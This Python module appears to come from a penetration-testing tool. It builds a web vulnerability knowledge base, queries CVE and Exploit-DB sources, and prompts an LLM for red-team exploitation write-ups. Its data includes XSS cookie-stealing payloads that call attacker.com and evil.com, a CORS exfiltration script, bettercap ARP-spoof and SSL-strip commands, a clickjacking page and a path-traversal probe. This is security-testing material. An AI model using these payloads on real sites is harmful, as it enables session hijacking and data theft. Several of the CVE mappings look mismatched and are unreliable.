"""
Vulnerability Intelligence Service - CVE Database, Exploit Database, and Attack Path Generation

Provides:
- CVE database lookups
- Exploit-DB integration
- Attack path generation
- Vulnerability writeups with exploitation steps
"""

import json
import re
import httpx
import logging
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime

logger = logging.getLogger(__name__)

# ============================================================================
# Vulnerability Knowledge Base (Offline-first, with online enrichment)
# ============================================================================

# Common web vulnerability database with exploitation details
VULN_KNOWLEDGE_BASE = {
    "missing_csp": {
        "cwe_id": "CWE-1021",
        "title": "Missing Content-Security-Policy Header",
        "severity": "medium",
        "cvss_base": 5.3,
        "description": "The Content-Security-Policy (CSP) header is not set, allowing potential Cross-Site Scripting (XSS) and data injection attacks.",
        "technical_details": """
Content-Security-Policy is a critical defense-in-depth mechanism that prevents:
- Cross-Site Scripting (XSS) attacks by restricting script sources
- Clickjacking via frame-ancestors directive
- Mixed content and data exfiltration
- Malicious resource injection

Without CSP, any XSS vulnerability becomes immediately exploitable.
        """.strip(),
        "exploitation_steps": [
            "1. Identify injection point (reflected/stored XSS, DOM-based)",
            "2. Craft XSS payload: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
            "3. For reflected XSS, craft malicious URL and send to victim",
            "4. For stored XSS, inject payload into stored content (comments, profiles)",
            "5. Payload executes without CSP blocking, stealing session cookies"
        ],
        "poc_payloads": [
            "<script>alert(document.domain)</script>",
            "<img src=x onerror=alert(1)>",
            "<script>fetch('https://attacker.com/log?c='+document.cookie)</script>",
            "javascript:alert(document.cookie)//",
        ],
        "related_cves": ["CVE-2021-41773", "CVE-2022-22965"],
        "references": [
            "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
            "https://owasp.org/www-community/attacks/xss/",
            "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"
        ],
        "remediation": "Implement strict CSP: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-ancestors 'none';"
    },
    "missing_hsts": {
        "cwe_id": "CWE-319",
        "title": "Missing HTTP Strict Transport Security (HSTS)",
        "severity": "medium",
        "cvss_base": 5.9,
        "description": "HSTS header not set, allowing SSL stripping attacks and man-in-the-middle downgrade attacks.",
        "technical_details": """
HSTS forces browsers to always use HTTPS, preventing:
- SSL stripping attacks (MITM converts HTTPS to HTTP)
- Certificate warnings being bypassed
- Initial HTTP request being intercepted

Without HSTS, attackers can intercept the first HTTP request before HTTPS redirect.
        """.strip(),
        "exploitation_steps": [
            "1. Position yourself as MITM (ARP spoofing, DNS poisoning, rogue AP)",
            "2. Use sslstrip or bettercap to intercept HTTP connections",
            "3. Present HTTP version of site to victim while connecting to real HTTPS site",
            "4. Capture credentials submitted over 'downgraded' HTTP connection",
            "5. Session hijacking via captured authentication tokens"
        ],
        "poc_payloads": [
            "# Using bettercap for SSL stripping:",
            "sudo bettercap -iface eth0",
            "set arp.spoof.targets <target_ip>",
            "set http.proxy.sslstrip true",
            "arp.spoof on; http.proxy on"
        ],
        "related_cves": ["CVE-2009-3555", "CVE-2014-3566"],
        "references": [
            "https://owasp.org/www-project-secure-headers/",
            "https://www.moxie.org/software/sslstrip/",
            "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html"
        ],
        "remediation": "Add header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
    },
    "missing_x_frame_options": {
        "cwe_id": "CWE-1021",
        "title": "Missing X-Frame-Options Header (Clickjacking)",
        "severity": "medium",
        "cvss_base": 4.3,
        "description": "Application can be embedded in frames, enabling clickjacking attacks.",
        "technical_details": """
Clickjacking (UI Redressing) allows attackers to:
- Trick users into clicking hidden elements
- Perform actions without user awareness
- Steal credentials via hidden login forms
- Execute unauthorized transactions

The page can be loaded in an iframe controlled by an attacker.
        """.strip(),
        "exploitation_steps": [
            "1. Create attacker-controlled webpage with hidden iframe",
            "2. Load target application in transparent iframe positioned over decoy content",
            "3. Victim clicks what appears to be harmless button",
            "4. Click is actually on hidden target application element",
            "5. Victim unknowingly performs actions (transfer money, change settings)"
        ],
        "poc_payloads": [
            """
<html>
<head><title>Win a Prize!</title></head>
<body>
<h1>Click the button to claim your prize!</h1>
<button style="position:absolute;top:100px;left:100px;z-index:1;opacity:0.01;">Win!</button>
<iframe src="https://target.com/transfer?amount=1000&to=attacker" 
        style="position:absolute;top:80px;left:80px;width:200px;height:100px;opacity:0.1;"></iframe>
</body>
</html>
            """.strip()
        ],
        "related_cves": ["CVE-2015-0236"],
        "references": [
            "https://owasp.org/www-community/attacks/Clickjacking",
            "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options"
        ],
        "remediation": "Add header: X-Frame-Options: DENY (or SAMEORIGIN if framing needed)"
    },
    "missing_x_xss_protection": {
        "cwe_id": "CWE-79",
        "title": "Missing X-XSS-Protection Header",
        "severity": "low",
        "cvss_base": 3.7,
        "description": "Browser XSS filter not enabled. Note: Modern browsers have deprecated this header in favor of CSP.",
        "technical_details": """
X-XSS-Protection enables the browser's built-in XSS filter (legacy).
- Modern browsers have removed this feature in favor of CSP
- Still provides defense-in-depth for older browsers
- Should be set to '1; mode=block' if used
        """.strip(),
        "exploitation_steps": [
            "1. This is a defense-in-depth header",
            "2. Focus on finding actual XSS vulnerabilities",
            "3. Test reflection points with XSS payloads",
            "4. Older browsers (IE, older Edge) won't filter reflected XSS"
        ],
        "poc_payloads": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>"
        ],
        "related_cves": [],
        "references": [
            "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection"
        ],
        "remediation": "Add header: X-XSS-Protection: 1; mode=block (but prioritize CSP implementation)"
    },
    "missing_x_content_type_options": {
        "cwe_id": "CWE-16",
        "title": "Missing X-Content-Type-Options Header",
        "severity": "medium",
        "cvss_base": 5.3,
        "description": "Browser MIME-type sniffing not disabled, potentially allowing XSS via content-type confusion.",
        "technical_details": """
Without 'nosniff', browsers may interpret files differently than intended:
- Upload .txt file containing JavaScript → browser executes as script
- API returning JSON could be interpreted as HTML
- Enables certain XSS attacks via MIME confusion

This is especially dangerous for file upload features.
        """.strip(),
        "exploitation_steps": [
            "1. Find file upload functionality",
            "2. Upload file with .txt or .jpg extension containing JS: <script>alert(1)</script>",
            "3. Access uploaded file directly via URL",
            "4. Browser may MIME-sniff and execute as HTML/JavaScript",
            "5. Achieve XSS via uploaded 'image' or 'text' file"
        ],
        "poc_payloads": [
            "# Upload as image.jpg with content:",
            "<html><script>alert(document.cookie)</script></html>",
            "",
            "# Or upload GIF87a header + JS:",
            "GIF87a<script>alert(1)</script>"
        ],
        "related_cves": ["CVE-2019-9517"],
        "references": [
            "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options"
        ],
        "remediation": "Add header: X-Content-Type-Options: nosniff"
    },
    "permissive_cors": {
        "cwe_id": "CWE-942",
        "title": "Overly Permissive CORS Policy",
        "severity": "high",
        "cvss_base": 7.5,
        "description": "Access-Control-Allow-Origin: * allows any website to read responses, enabling data theft.",
        "technical_details": """
CORS with wildcard (*) allows any origin to:
- Read API responses from user's authenticated session
- Access sensitive user data cross-origin
- Bypass same-origin policy protections

This is especially critical for authenticated endpoints.
        """.strip(),
        "exploitation_steps": [
            "1. Create malicious website: attacker.com",
            "2. Add JavaScript to make cross-origin requests to vulnerable API",
            "3. Victim visits attacker.com while logged into target",
            "4. JavaScript fetches sensitive data from target API (using victim's cookies)",
            "5. CORS allows response to be read → exfiltrate to attacker server"
        ],
        "poc_payloads": [
            """
// On attacker.com:
fetch('https://vulnerable-api.com/api/user/profile', {
    credentials: 'include'  // Send victim's cookies
})
.then(r => r.json())
.then(data => {
    // Steal user data
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
            """.strip()
        ],
        "related_cves": ["CVE-2020-5902"],
        "references": [
            "https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny",
            "https://portswigger.net/web-security/cors"
        ],
        "remediation": "Restrict CORS to specific trusted origins: Access-Control-Allow-Origin: https://trusted-site.com"
    },
    "insecure_cookie_no_httponly": {
        "cwe_id": "CWE-1004",
        "title": "Cookie Without HttpOnly Flag",
        "severity": "medium",
        "cvss_base": 5.3,
        "description": "Session cookie accessible via JavaScript, enabling theft via XSS attacks.",
        "technical_details": """
Without HttpOnly, cookies can be accessed via document.cookie:
- Any XSS vulnerability can steal session cookies
- Session hijacking becomes trivial with XSS
- Even 'minor' XSS becomes critical

HttpOnly is a critical defense against session theft.
        """.strip(),
        "exploitation_steps": [
            "1. Find XSS vulnerability (reflected, stored, or DOM-based)",
            "2. Inject payload to steal cookies:",
            "3. <script>new Image().src='https://attacker.com/c='+document.cookie</script>",
            "4. Victim's session cookie sent to attacker",
            "5. Attacker uses stolen cookie to hijack session"
        ],
        "poc_payloads": [
            "<script>document.location='https://attacker.com/steal?c='+document.cookie</script>",
            "<img src=x onerror=\"fetch('https://attacker.com/?c='+document.cookie)\">",
            "<script>new Image().src='https://evil.com/log?c='+btoa(document.cookie)</script>"
        ],
        "related_cves": ["CVE-2019-11358"],
        "references": [
            "https://owasp.org/www-community/HttpOnly",
            "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
        ],
        "remediation": "Set HttpOnly flag on all session cookies: Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict"
    },
    "insecure_cookie_no_secure": {
        "cwe_id": "CWE-614",
        "title": "Cookie Without Secure Flag",
        "severity": "medium",
        "cvss_base": 5.3,
        "description": "Cookie may be transmitted over HTTP, allowing interception via MITM attacks.",
        "technical_details": """
Without Secure flag, cookies are sent over HTTP:
- MITM can intercept cookie on any HTTP request
- Session hijacking via network sniffing
- Even one HTTP request leaks the cookie

Always combine with HSTS for full protection.
        """.strip(),
        "exploitation_steps": [
            "1. Position as MITM (same network, ARP spoofing)",
            "2. Force/wait for HTTP request (image, redirect, mixed content)",
            "3. Sniff HTTP traffic with Wireshark/tcpdump",
            "4. Extract session cookie from HTTP Cookie header",
            "5. Use cookie to hijack victim's session"
        ],
        "poc_payloads": [
            "# Wireshark filter:",
            "http.cookie contains \"session\"",
            "",
            "# tcpdump:",
            "sudo tcpdump -A -s0 port 80 | grep -i cookie"
        ],
        "related_cves": [],
        "references": [
            "https://owasp.org/www-community/controls/SecureCookieAttribute"
        ],
        "remediation": "Set Secure flag on all sensitive cookies: Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Strict"
    },
    "sensitive_data_exposure": {
        "cwe_id": "CWE-200",
        "title": "Sensitive Data Exposure in Traffic",
        "severity": "high",
        "cvss_base": 7.5,
        "description": "Credentials, tokens, or sensitive data transmitted in clear text or logged.",
        "technical_details": """
Sensitive data exposure occurs when:
- Credentials sent in URL parameters (logged in server/proxy)
- API keys embedded in client-side code
- PII transmitted without encryption
- Sensitive data in error messages

This data can be captured via MITM, logs, or browser history.
        """.strip(),
        "exploitation_steps": [
            "1. Review captured traffic for sensitive patterns",
            "2. Check URL parameters for credentials/tokens",
            "3. Examine request bodies for PII/secrets",
            "4. Test if credentials work for account takeover",
            "5. Report scope of data exposure"
        ],
        "poc_payloads": [
            "# Common sensitive patterns to search:",
            "password=, passwd=, pwd=",
            "api_key=, apikey=, api-key=",
            "secret=, token=, auth=",
            "ssn=, social_security=",
            "credit_card=, card_number=, cvv="
        ],
        "related_cves": ["CVE-2019-1010266"],
        "references": [
            "https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure"
        ],
        "remediation": "Use HTTPS everywhere, avoid URL parameters for sensitive data, implement proper encryption"
    },
    "information_disclosure": {
        "cwe_id": "CWE-200",
        "title": "Information Disclosure via Error Messages",
        "severity": "medium",
        "cvss_base": 5.3,
        "description": "Server error responses reveal internal implementation details, stack traces, or file paths.",
        "technical_details": """
Information disclosure helps attackers:
- Identify framework/language (targeted exploits)
- Discover internal paths (directory traversal)
- Find database structure (SQL injection)
- Identify vulnerable dependencies
        """.strip(),
        "exploitation_steps": [
            "1. Trigger errors (invalid input, missing params)",
            "2. Analyze error messages for sensitive info",
            "3. Identify framework version for CVE lookup",
            "4. Use disclosed paths for further attacks",
            "5. Chain with other vulnerabilities"
        ],
        "poc_payloads": [
            "# Error triggering:",
            "?id='",                    "# SQL error",
            "?file=../../../etc/passwd", "# Path disclosure",
            "?debug=1&trace=1",         "# Debug mode"
        ],
        "related_cves": [],
        "references": [
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/"
        ],
        "remediation": "Implement generic error messages in production, log details server-side only"
    }
}

# Mapping from finding categories to knowledge base entries
CATEGORY_TO_VULN = {
    "missing_csp": "missing_csp",
    "missing_hsts": "missing_hsts",
    "missing_x_frame_options": "missing_x_frame_options",
    "missing_x_xss_protection": "missing_x_xss_protection",
    "missing_x_content_type_options": "missing_x_content_type_options",
    "permissive_cors": "permissive_cors",
    "cors": "permissive_cors",
    "cookie_no_httponly": "insecure_cookie_no_httponly",
    "cookie_no_secure": "insecure_cookie_no_secure",
    "cookies": "insecure_cookie_no_httponly",
    "sensitive_data": "sensitive_data_exposure",
    "information_disclosure": "information_disclosure",
    "headers": "missing_csp",  # Default for header issues
}


def get_vuln_intelligence(finding_category: str, finding_title: str) -> Optional[Dict]:
    """
    Get detailed vulnerability intelligence for a finding.
    
    Returns enriched data with:
    - CWE ID
    - Technical details
    - Exploitation steps
    - PoC payloads
    - Related CVEs
    - References
    - Remediation
    """
    # Try to map category to knowledge base
    vuln_key = None
    
    # Direct category match
    if finding_category.lower() in CATEGORY_TO_VULN:
        vuln_key = CATEGORY_TO_VULN[finding_category.lower()]
    
    # Title-based matching
    title_lower = finding_title.lower()
    if "csp" in title_lower or "content-security-policy" in title_lower:
        vuln_key = "missing_csp"
    elif "hsts" in title_lower or "strict-transport" in title_lower:
        vuln_key = "missing_hsts"
    elif "x-frame" in title_lower or "clickjacking" in title_lower:
        vuln_key = "missing_x_frame_options"
    elif "x-xss" in title_lower:
        vuln_key = "missing_x_xss_protection"
    elif "x-content-type" in title_lower or "nosniff" in title_lower:
        vuln_key = "missing_x_content_type_options"
    elif "cors" in title_lower:
        vuln_key = "permissive_cors"
    elif "httponly" in title_lower:
        vuln_key = "insecure_cookie_no_httponly"
    elif "secure flag" in title_lower or "cookie" in title_lower and "secure" in title_lower:
        vuln_key = "insecure_cookie_no_secure"
    elif "sensitive" in title_lower or "password" in title_lower or "credential" in title_lower:
        vuln_key = "sensitive_data_exposure"
    elif "stack trace" in title_lower or "error" in title_lower or "disclosure" in title_lower:
        vuln_key = "information_disclosure"
    
    if vuln_key and vuln_key in VULN_KNOWLEDGE_BASE:
        return VULN_KNOWLEDGE_BASE[vuln_key]
    
    return None


async def search_cve_database(keywords: List[str], max_results: int = 5) -> List[Dict]:
    """
    Search CVE database for related vulnerabilities.
    
    Uses local NVD database first (offline), then falls back to API if needed.
    """
    from backend.services.nvd_service import search_cves_local_by_keyword, _check_local_db_available
    
    results = []
    
    try:
        # Try local database first for each keyword
        if _check_local_db_available():
            for keyword in keywords[:3]:
                # Search by keyword in local DB
                local_results = search_cves_local_by_keyword(keyword, max_results=max_results)
                
                for cve in local_results:
                    if len(results) >= max_results:
                        break
                        
                    cve_id = cve.get("cve_id") or cve.get("id", "")
                    
                    # Avoid duplicates
                    if any(r["cve_id"] == cve_id for r in results):
                        continue
                    
                    # Get CVSS score from various possible fields
                    cvss_score = cve.get("cvss_v3_score")
                    cvss_severity = cve.get("cvss_v3_severity", "UNKNOWN")
                    if not cvss_score and cve.get("cvss_v3"):
                        cvss_score = cve["cvss_v3"].get("base_score")
                        cvss_severity = cve["cvss_v3"].get("base_severity", "UNKNOWN")
                    
                    results.append({
                        "cve_id": cve_id,
                        "description": cve.get("description", "")[:500],
                        "cvss_score": cvss_score,
                        "cvss_severity": cvss_severity,
                        "published": cve.get("published", ""),
                        "references": cve.get("references", [])[:5],
                        "url": f"https://nvd.nist.gov/vuln/detail/{cve_id}",
                        "in_kev": cve.get("in_kev", False)
                    })
                
        # If no local results, try API (with fallback)
        if not results:
            results = await _search_cve_api_fallback(keywords, max_results)
                    
    except Exception as e:
        logger.warning(f"CVE database search failed: {e}")
        # Try API fallback
        results = await _search_cve_api_fallback(keywords, max_results)
    
    return results


async def _search_cve_api_fallback(keywords: List[str], max_results: int = 5) -> List[Dict]:
    """Fallback to NVD API if local database unavailable."""
    from backend.core.config import settings
    
    results = []
    try:
        query = " ".join(keywords[:3])
        
        async with httpx.AsyncClient(timeout=10.0) as client:
            params = {
                "keywordSearch": query,
                "resultsPerPage": max_results
            }
            
            headers = {}
            if settings.nvd_api_key:
                headers["apiKey"] = settings.nvd_api_key
            
            response = await client.get(
                "https://services.nvd.nist.gov/rest/json/cves/2.0",
                params=params,
                headers=headers
            )
            
            if response.status_code == 200:
                data = response.json()
                for vuln in data.get("vulnerabilities", [])[:max_results]:
                    cve = vuln.get("cve", {})
                    cve_id = cve.get("id", "")
                    
                    cvss_score = None
                    cvss_severity = None
                    metrics = cve.get("metrics", {})
                    if "cvssMetricV31" in metrics:
                        cvss_data = metrics["cvssMetricV31"][0].get("cvssData", {})
                        cvss_score = cvss_data.get("baseScore")
                        cvss_severity = cvss_data.get("baseSeverity")
                    elif "cvssMetricV2" in metrics:
                        cvss_data = metrics["cvssMetricV2"][0].get("cvssData", {})
                        cvss_score = cvss_data.get("baseScore")
                    
                    descriptions = cve.get("descriptions", [])
                    description = next(
                        (d["value"] for d in descriptions if d.get("lang") == "en"),
                        ""
                    )
                    
                    results.append({
                        "cve_id": cve_id,
                        "description": description[:500],
                        "cvss_score": cvss_score,
                        "cvss_severity": cvss_severity,
                        "published": cve.get("published", ""),
                        "references": [],
                        "url": f"https://nvd.nist.gov/vuln/detail/{cve_id}"
                    })
    except Exception as e:
        logger.warning(f"CVE API fallback failed: {e}")
    
    return results


async def search_exploit_db(keywords: List[str], max_results: int = 5) -> List[Dict]:
    """
    Search Exploit-DB for relevant exploits.
    
    Uses local ExploitDB SQLite database (offline) first.
    """
    from backend.services.exploit_db_service import ExploitDBService
    
    results = []
    
    try:
        exploit_service = ExploitDBService()
        
        # Search local database for each keyword
        for keyword in keywords[:3]:
            if len(results) >= max_results:
                break
                
            # Use the .search() method which queries local SQLite
            local_exploits = await exploit_service.search(
                query=keyword,
                limit=max_results
            )
            
            for exploit in local_exploits:
                if len(results) >= max_results:
                    break
                
                # Handle both dict and dataclass response
                exploit_id = exploit.get('id', '') if isinstance(exploit, dict) else getattr(exploit, 'id', '')
                
                # Avoid duplicates
                if any(r.get("id") == exploit_id for r in results):
                    continue
                
                if isinstance(exploit, dict):
                    results.append({
                        "id": exploit_id,
                        "title": exploit.get('title', ''),
                        "description": exploit.get('description', ''),
                        "platform": exploit.get('platform', ''),
                        "exploit_type": exploit.get('exploit_type', ''),
                        "cve_ids": exploit.get('cve_ids', []),
                        "source": "exploitdb",
                        "url": f"https://www.exploit-db.com/exploits/{exploit_id}",
                        "verified": exploit.get('verified', False),
                        "msf_module": exploit.get('msf_module')
                    })
                else:
                    results.append({
                        "id": exploit_id,
                        "title": getattr(exploit, 'title', ''),
                        "description": getattr(exploit, 'description', ''),
                        "platform": getattr(exploit, 'platform', ''),
                        "exploit_type": getattr(exploit, 'exploit_type', ''),
                        "cve_ids": getattr(exploit, 'cve_ids', []),
                        "source": "exploitdb",
                        "url": f"https://www.exploit-db.com/exploits/{exploit_id}",
                        "verified": getattr(exploit, 'verified', False),
                        "msf_module": getattr(exploit, 'msf_module', None)
                    })
                
    except Exception as e:
        logger.warning(f"Exploit-DB local search failed: {e}")
        # Fallback to curated offline references
        results = get_offline_exploit_references(keywords)
    
    return results[:max_results]


def get_offline_exploit_references(keywords: List[str]) -> List[Dict]:
    """
    Get relevant exploit references from offline database.
    
    Maps common vulnerability types to known exploits.
    """
    keyword_str = " ".join(keywords).lower()
    exploits = []
    
    # XSS exploits
    if any(kw in keyword_str for kw in ["xss", "csp", "script", "injection"]):
        exploits.extend([
            {
                "title": "XSS Cookie Stealer",
                "type": "webapps",
                "platform": "multiple",
                "description": "Generic XSS payload for stealing cookies via image request",
                "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection"
            },
            {
                "title": "BeEF - Browser Exploitation Framework",
                "type": "tool",
                "platform": "multiple",
                "description": "Hook browsers via XSS for advanced exploitation",
                "url": "https://beefproject.com/"
            }
        ])
    
    # CORS exploits
    if "cors" in keyword_str:
        exploits.append({
            "title": "CORS Exploit - Data Theft",
            "type": "webapps",
            "platform": "multiple",
            "description": "Exploit misconfigured CORS to steal authenticated user data",
            "url": "https://portswigger.net/web-security/cors"
        })
    
    # SSL/HSTS exploits
    if any(kw in keyword_str for kw in ["hsts", "ssl", "tls", "https"]):
        exploits.extend([
            {
                "title": "sslstrip - SSL Stripping Attack",
                "type": "tool",
                "platform": "linux",
                "description": "MITM tool to strip SSL and capture credentials",
                "url": "https://github.com/moxie0/sslstrip"
            },
            {
                "title": "Bettercap - Network Attack Tool",
                "type": "tool",
                "platform": "multiple",
                "description": "Swiss army knife for MITM attacks including SSL stripping",
                "url": "https://www.bettercap.org/"
            }
        ])
    
    # Clickjacking
    if any(kw in keyword_str for kw in ["frame", "clickjack", "x-frame"]):
        exploits.append({
            "title": "Clickjacking PoC Generator",
            "type": "webapps",
            "platform": "multiple",
            "description": "Generate clickjacking proof-of-concept pages",
            "url": "https://github.com/nicholasaleks/clickjack-test"
        })
    
    # Session/Cookie attacks
    if any(kw in keyword_str for kw in ["cookie", "session", "httponly"]):
        exploits.append({
            "title": "Session Hijacking via XSS",
            "type": "webapps",
            "platform": "multiple",
            "description": "Steal session cookies using XSS when HttpOnly not set",
            "url": "https://owasp.org/www-community/attacks/Session_hijacking_attack"
        })
    
    return exploits


async def generate_ai_exploitation_writeup(
    findings: List[Dict],
    traffic_summary: List[Dict],
    target_info: Dict,
    agent_activity: Optional[Dict] = None
) -> Optional[str]:
    """
    Generate comprehensive AI-powered offensive security report.
    
    Focuses on attacker perspective:
    - What an attacker would do
    - Tools and techniques to use
    - Known exploits and CVEs
    - Remediation guidance
    """
    from backend.core.config import settings
    
    if not settings.gemini_api_key:
        return None
    
    try:
        from google import genai
        from google.genai import types
        
        client = genai.Client(api_key=settings.gemini_api_key)
        
        # Categorize findings by type for better analysis
        critical_findings = [f for f in findings if f.get('severity') == 'critical']
        high_findings = [f for f in findings if f.get('severity') == 'high']
        
        # Prepare findings summary with exploit potential
        findings_text = "\n".join([
            f"- [{f.get('severity', 'medium').upper()}] {f.get('title')}: {f.get('description', '')[:150]}"
            for f in findings[:15]
        ])
        
        # Get CVE/exploit references if available
        cve_refs = [f.get('cve_id') for f in findings if f.get('cve_id')]
        exploit_refs = [f.get('exploit_ref') for f in findings if f.get('exploit_ref')]

        agent_activity = agent_activity or {}
        execution_log = agent_activity.get("execution_log", [])
        verification_results = agent_activity.get("verification_results", [])
        monitoring_active = agent_activity.get("monitoring_active")
        goal_progress = agent_activity.get("goal_progress", {})
        captured_summary = agent_activity.get("captured_data_summary", {})

        tools_summary = "\n".join([
            f"- {log.get('tool_name', log.get('tool_id', 'unknown'))} | success={log.get('success')} | findings={log.get('findings_count', 0)} | time={log.get('execution_time', 0)}s"
            for log in execution_log[:20]
        ]) or "- None"

        verification_summary = "\n".join([
            f"- {v.get('tool_id', 'unknown')}: status={v.get('status')} | success={v.get('success')} | indicators={', '.join(v.get('indicators', [])) or 'none'}"
            for v in verification_results[:20]
        ]) or "- None"
        
        prompt = f"""You are an elite red team operator writing a penetration test report. Your report must be structured, readable, and actionable.

═══════════════════════════════════════════════════════════════════════
                        TARGET INTELLIGENCE
═══════════════════════════════════════════════════════════════════════
• Target: {target_info.get('target_host', 'Unknown')}:{target_info.get('target_port', 'Unknown')}
• Traffic Captured: {len(traffic_summary)} requests
• Critical Issues: {len(critical_findings)}
• High Issues: {len(high_findings)}
• Total Vulnerabilities: {len(findings)}

═══════════════════════════════════════════════════════════════════════
                                         VULNERABILITY INVENTORY
═══════════════════════════════════════════════════════════════════════
{findings_text}

═══════════════════════════════════════════════════════════════════════
                                         AGENTIC ACTIVITY (TOOLS)
═══════════════════════════════════════════════════════════════════════
Monitoring Active: {monitoring_active}
Captured Summary: credentials={captured_summary.get('credentials', 0)}, tokens={captured_summary.get('tokens', 0)}, cookies={captured_summary.get('cookies', 0)}

Execution Log:
{tools_summary}

Verification Results:
{verification_summary}

Write a report in MARKDOWN with clear, professional formatting. REQUIRED:
- Use headings (##, ###, ####)
- Use bullet lists and numbered lists where appropriate
- Use **bold** for labels and key facts
- Keep spacing and readability high
- Include explicit statements of what the agent tried (e.g., "SSL stripping attempted: yes/no") and outcomes

REQUIRED SECTIONS:

## 📝 Penetration Test Writeup

### 1) Executive Summary
- **Overall Risk:**
- **Most Exploitable Issues:**
- **Likely Attacker Approach:**

### 2) Scope & Target Context
- **Target:** {target_info.get('target_host', 'Unknown')}:{target_info.get('target_port', 'Unknown')}
- **Traffic Captured:** {len(traffic_summary)} requests
- **Total Vulnerabilities:** {len(findings)}

### 3) Attack Surface Overview
- **Entry Points:**
- **Sensitive Data Exposure:**
- **Authentication/Session Risks:**

### 4) Agentic Tooling Activity
- **Monitoring Active:**
- **Goals Set / Progress:** summarize goal_progress if available
- **Tools Executed:** include list from Execution Log
- **Verified Outcomes:** include verification results
- **Explicit Technique Outcomes:** SSL stripping, cookie hijack, script injection, credential capture — state "attempted" and "successful" or "not observed"

### 5) Exploitation Playbook (Top Findings)
For each critical/high finding:
- **Finding Name**
    - **Severity:**
    - **Vulnerability Type:**
    - **Where:**
    - **How to Exploit (steps):**
    - **Expected Result:**
    - **PoC/Command Snippet:**

### 6) Attack Chains
- **Chain 1:**
    1. Step 1
    2. Step 2
    3. Step 3
    - **Impact:**

### 7) Remediation Priority Matrix
| Priority | Finding | Fix | Effort |
|----------|---------|-----|--------|

### 8) Follow‑Up Testing Plan
- **Automated:**
- **Manual:**

Keep response under 900 words. Write as a professional red teamer would: precise, structured, and actionable."""

        response = client.models.generate_content(
            model=settings.gemini_model_id,
            contents=prompt,
            config=types.GenerateContentConfig(
                thinking_config=types.ThinkingConfig(thinking_level="high"),
                max_output_tokens=2000,
            )
        )
        
        if response and response.text:
            return response.text
            
    except Exception as e:
        logger.warning(f"AI writeup generation failed: {e}")
    
    return None


def generate_attack_paths(findings: List[Dict]) -> List[Dict]:
    """
    Generate potential attack paths based on findings.
    
    Creates a chain of vulnerabilities showing how they can be combined.
    """
    attack_paths = []
    
    # Find XSS-enabling conditions
    has_no_csp = any("csp" in f.get("title", "").lower() for f in findings)
    has_no_httponly = any("httponly" in f.get("title", "").lower() for f in findings)
    has_cors_issue = any("cors" in f.get("title", "").lower() for f in findings)
    
    # XSS → Session Hijacking path
    if has_no_csp and has_no_httponly:
        attack_paths.append({
            "name": "XSS to Session Hijacking",
            "severity": "critical",
            "description": "Missing CSP allows XSS attacks, and missing HttpOnly flag enables cookie theft",
            "steps": [
                "Find XSS injection point (form field, URL parameter, stored content)",
                "Inject payload: <script>fetch('https://attacker.com/c='+document.cookie)</script>",
                "CSP doesn't block the script execution",
                "HttpOnly not set - document.cookie returns session token",
                "Attacker receives session cookie and hijacks user account"
            ],
            "impact": "Complete account takeover of any user who triggers the XSS",
            "likelihood": "high"
        })
    
    # CORS → Data Theft path
    if has_cors_issue:
        attack_paths.append({
            "name": "CORS Misconfiguration to Data Theft",
            "severity": "high",
            "description": "Permissive CORS allows malicious sites to read authenticated API responses",
            "steps": [
                "Attacker creates malicious website",
                "Adds JavaScript to fetch data from vulnerable API",
                "Victim visits attacker site while logged into target",
                "Browser sends victim's cookies with cross-origin request",
                "CORS allows attacker's JavaScript to read the response",
                "Sensitive user data exfiltrated to attacker server"
            ],
            "impact": "Theft of sensitive user data, potential account takeover",
            "likelihood": "medium"
        })
    
    # Missing security headers general path
    has_no_hsts = any("hsts" in f.get("title", "").lower() for f in findings)
    if has_no_hsts:
        attack_paths.append({
            "name": "SSL Stripping Attack",
            "severity": "high",
            "description": "Missing HSTS allows MITM to downgrade HTTPS to HTTP",
            "steps": [
                "Attacker positions as MITM (rogue WiFi, ARP spoof)",
                "Intercepts initial HTTP request before HTTPS redirect",
                "Uses sslstrip to serve HTTP version to victim",
                "Victim submits credentials over HTTP (thinking it's HTTPS)",
                "Attacker captures credentials in clear text"
            ],
            "impact": "Credential theft for any user on compromised network",
            "likelihood": "medium"
        })
    
    return attack_paths


def enrich_finding_with_intelligence(finding: Dict) -> Dict:
    """
    Enrich a single finding with vulnerability intelligence.
    """
    category = finding.get("category", "")
    title = finding.get("title", "")
    
    intel = get_vuln_intelligence(category, title)
    
    if intel:
        finding["intelligence"] = {
            "cwe_id": intel.get("cwe_id"),
            "cvss_base": intel.get("cvss_base"),
            "technical_details": intel.get("technical_details"),
            "exploitation_steps": intel.get("exploitation_steps"),
            "poc_payloads": intel.get("poc_payloads"),
            "related_cves": intel.get("related_cves"),
            "references": intel.get("references"),
            "remediation_detailed": intel.get("remediation")
        }
    
    return finding
